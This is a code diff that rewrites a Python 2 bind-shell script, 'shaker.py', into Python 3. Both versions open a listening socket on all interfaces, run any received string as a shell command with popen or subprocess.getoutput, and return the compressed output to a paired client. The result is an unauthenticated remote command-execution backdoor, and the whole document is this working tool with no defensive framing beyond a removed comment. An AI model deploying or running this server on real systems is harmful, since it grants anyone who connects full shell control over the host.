@@ -1,134 +1,115 @@
-# Require python2 
-# Bind shell by j0lt
-# This script is just for giving reference that how bind shell look like in python, you can modify as per your need.
-# Usage Format :
-#   For Running Server : shaker.py server [port]
-#   For Running client : shaker.py client [port] [ip of server]
-
 import socket
-from sys import argv
-from os import _exit
+import sys
 import json
-from zlib import compress,decompress
-from platform import system
+import zlib
+import platform
+import subprocess
 
-
-class server:
-
-    def __init__(self,port):
-        self.ip = '0.0.0.0'
+class BindShellServer:
+    def __init__(self, port):
+        self.host = '0.0.0.0'
         self.port = port
-        self.l = "cd"
-        self.o = system()
-        if self.o == "Linux" or self.o == "SunOS":
-            self.l = "pwd"
+        self.init_cmd = 'pwd' if platform.system() in ['Linux', 'SunOS'] else 'cd'
 
     def start(self):
         try:
-            so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            so.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
-            so.bind((self.ip,self.port))
-        except socket.error:
-            print "There is some error with address...\t The Server could not be started"
-            _exit(1)
-        try:
-            so.listen(1)
-            host = socket.gethostbyname(socket.gethostname())
-            print "[%s:%s] Waiting for connection ..."%(host,self.port)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server_socket:
+                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+                server_socket.bind((self.host, self.port))
+                server_socket.listen(1)
+                print(f"[{socket.gethostbyname(socket.gethostname())}:{self.port}] Waiting for connection...")
 
+                conn, addr = server_socket.accept()
+                with conn:
+                    print(f"Connected with {addr[0]}")
+                    welcome_msg = {
+                        "msg": f"Connected with {platform.system()} at {socket.gethostbyname(socket.gethostname())}",
+                        "location": self.run_cmd(self.init_cmd)[1]
+                    }
+                    conn.sendall(zlib.compress(json.dumps(welcome_msg).encode()))
 
-            while 1:
+                    while True:
+                        try:
+                            command = conn.recv(2048)
+                            if not command:
+                                break
+                            command = command.decode().strip()
+                            if command.lower() == 'exit':
+                                break
+                            output, location = self.run_cmd(command)
+                            response = {"output": output, "location": location}
+                            conn.sendall(zlib.compress(json.dumps(response).encode()))
+                        except Exception as e:
+                            print(f"Connection error: {e}")
+                            break
 
-                ob , address = so.accept()
-                print "Connected with %s "%address[0]
-                ob.send(compress(json.dumps({"msg":"Connected With %s os at %s"%(self.o,host) , "location":self.__cmd(self.l)[1]}).encode()))
-                while 1:
-                    try:
-                        command = ob.recv(2048)
-                        assert(command != "exit")
-                        reply = self.__cmd(command)
-                        data = json.dumps({"output":reply[0], "location":reply[1]})
-                        ob.send(compress(data.encode()))
-                    except socket.error:
-                        print "Connection Ended..\n Reconnecting..."
-                        break
-                    except (KeyboardInterrupt,AssertionError):
-                        print "Stoping server .."
-                        ob.send("Server Stopped..")
-                        ob.close()
-                        so.close()
-                        _exit(1)
-
-        except socket.error:
-            print "Connection problem .."
-            so.close()
-            _exit(1)
         except KeyboardInterrupt:
-            print "Stoping server .."
-            so.close()
-            _exit(1)
+            print("Server interrupted by user.")
+        except Exception as e:
+            print(f"Server error: {e}")
 
-    def __cmd(self,command):
-        from os import popen
+    def run_cmd(self, command):
         try:
-            q = popen(self.l).read()
-            o = popen(command).read()
+            location = subprocess.getoutput(self.init_cmd)
+            output = subprocess.getoutput(command)
+            return output, location
+        except Exception as e:
+            return f"Command failed: {e}", ""
 
-            return (o,q)
-        except:
-            return "Sorry!! Command not executed"
-
-class client:
-
-    def __init__(self,ip, port):
+class BindShellClient:
+    def __init__(self, ip, port):
         self.ip = ip
         self.port = port
 
     def start(self):
-            so = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-            while 1:
-                try:
-                    so.connect((self.ip,self.port))
-                    data = json.loads(decompress(so.recv(2048)).decode())
-                    print data.get('msg')
-                except socket.error:
-                    print "Connection Error ... or Server is down"
-                    if raw_input("Try Reconnect[Y/n]").lower() == 'n':
-                        _exit(1)
-                    else:
-                        continue
+        while True:
+            try:
+                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
+                    client_socket.connect((self.ip, self.port))
+                    data = json.loads(zlib.decompress(client_socket.recv(2048)).decode())
+                    print(data.get("msg"))
 
-                while 1:
-                    try:
+                    while True:
+                        try:
+                            command = input(f"{data.get('location').strip()}> ")
+                            if command.lower() == 'exit':
+                                client_socket.sendall(command.encode())
+                                print("Exiting client.")
+                                return
+                            client_socket.sendall(command.encode())
+                            response = json.loads(zlib.decompress(client_socket.recv(2048)).decode())
+                            print(response.get("output"))
+                            data = response
+                        except Exception as e:
+                            print(f"Server disconnected: {e}")
+                            return
+            except (ConnectionRefusedError, socket.error):
+                print("Connection failed. Server may be down.")
+                retry = input("Try reconnect? [Y/n]: ").strip().lower()
+                if retry == 'n':
+                    break
 
-                        a = raw_input('%s>'%data.get('location').replace('\n',''))
-                        so.sendall(a)
-                        assert(a.lower() != 'exit')
-                        data = json.loads(decompress(so.recv(2048)).decode())
-                        print data.get('output')
-                    except (socket.error,AssertionError) :
-                        print "Server Disconnected"
-                        so.close()
-                        _exit(1)
+def main():
+    if len(sys.argv) < 3:
+        print("Usage: python3 shaker.py [client/server] [port] [ip (client only)]")
+        sys.exit(1)
 
-if __name__ == "__main__":
+    role = sys.argv[1].lower()
+    port = int(sys.argv[2])
 
-    try:
-        assert(argv[1].lower() in ["client", "server"])
-        assert (int(argv[2]) in range(1, 65535))
+    if role == 'server':
+        server = BindShellServer(port)
+        server.start()
+    elif role == 'client':
+        if len(sys.argv) != 4:
+            print("Client mode requires IP address.")
+            sys.exit(1)
+        ip = sys.argv[3]
+        client = BindShellClient(ip, port)
+        client.start()
+    else:
+        print("Invalid role. Choose 'client' or 'server'.")
 
-        port = int(argv[2])
-        if argv[1].lower() == "client":
-            ip = argv[3]
-            assert (socket.inet_aton(argv[2]))
-            s = client(ip, port)
-            s.start()
-
-        else:
-            s = server(port)
-            s.start()
-
-    except:
-        print "The Parameter provided are wrong \n\n\tUsage Format : shaker.py [client/server] [port] [ip{just for client}]"
-        _exit(1)
+if __name__ == '__main__':
+    main()
 
